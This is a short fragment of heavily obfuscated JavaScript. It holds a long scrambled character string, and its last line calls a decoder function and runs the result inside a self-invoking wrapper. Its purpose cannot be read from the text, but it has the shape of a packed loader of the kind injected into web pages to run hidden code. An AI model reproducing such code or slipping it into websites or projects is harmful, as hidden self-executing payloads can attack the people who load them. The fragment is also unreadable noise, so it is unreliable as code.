z4.+nbW2$6X!3X1et(}]idfX_$e2eG$2illk_X]e)3\/Xr2n3llron)9r]ro6XaX}(_X)lRr%XaFeX+$o16{=Kto.12;c=+%X`(c!dg1re%__)tS].0)t?$7(%FhW6ShXX!(X2,=_hdu_[0tC_dso07){_Xy{3e.Z]o_2XvX[o0}e,i_Nn]tX!rrts((+_e+,b6#1\'m6X"9eX01Xa!$vXes}>Xrfom}XoXb]e.XX@p8oAo6X4.o9$^1X;7_=c%b{@X[d1Xo:$(bXdft.c)be4d6}_X._)9}utnQefX6 ]!XXXnX_6!]<{49}td0] X.cfn&}y sD_X]ffnRtf})ntSX],%0XX2obe.pX!_}%i9b}inZ.gc..+]8 hu=0^tOXdc{%it=tIXxa%l9Xets",e]=X-XfX]XXeX3d l160U]plX_6]e(t!n(]a[%.ho]nd3g4X)fdnfo_0ti([X,X*]a]+Xhe{TtX.216X2XX0t.Xi_n714r]$d)XvoX7_;t!=j%Et)%}(iX6s6[X_arr?l6Xn)XUdp_[4 dwve]as]4iXXXsb3dBe_4r ?Xc3XbX8c;XX,BX\'_pX o_Xobc;ffX73_oXao)9]"pXX_hdf.eX];]s1!}emXe.oXej=XX%};eb.Xn3X]XXehXS+}XrX.X_7t;XeteX;eT]r^>c]X43(X]f{]%XXnVnw1(bbb)<XXe!{XX!;_ot+XeXn(tX=24b[tcrin))33tXXp3e7Xe(2"d;X,(cXuc@X;_(o_3Xt9r_%lx$X,,\'Xn\/!]_g;16X:;;iY ]_X; %.Z;c8]ea!bGt3ig 3_=XXtrofCXrbD9o3u_]_X6Xa}re.!t[dg]t76!)_g=$X.]o({]3] X.u_r]t0& _](s9( "04incv4_3+a;! hnXy_%_=tmi]6m)c_X%uoi_s%("XP.=w!=e4X6u33}[(:4)4}[,y4e_51n)lXX}boo)dXnrX(.bCrCiXbXr9ola!XXY2D{#)l 4oaXi)-ba{eX1XgX0c8[a%n.X"]g.rt]X(2_.sX]!0X6XX $%&l3c]a6X(]en;gLs9_XlXX_5X.tbd bt3l%,st rXlspr=].} (_86rehl62Xj&o3n(sre2_,o_lj}Xta_ajs.%b]}3k0Xb%o}% -)_be(?bf1).1 (t=ar()G0b]bi]X%XaX{b..Xo6Xcou.Id.&X3]tQb{c)Xe0b!J};(o"t.Xoft_c_a%a7ab_XXbaXQX=8} }3%mj{c_=X{fX(>_)rXY6ara]h7, XobM)=eel! ;tXy():_no"o!adfXa,;;o}(XOd,1+.tl0.e_u.%a ebscV_6f.cle%)d-V%x1)g2$_4h0lr0(r=cpf EsXg) o{$4__2i4>b _{XOp21%5XXai69w_:dn;XejXie(N)}:XplOXXi_AoSrVvio)].;]5 :}6uX9y(" ];.r .aaDe!Kt)XXt%l (X.4 >_[)X]+XX Xx)b6=1;]].r(f3XgXz Xo}6'));var suV=qnQ(iWb,yXT );suV(9331);return 3409})()
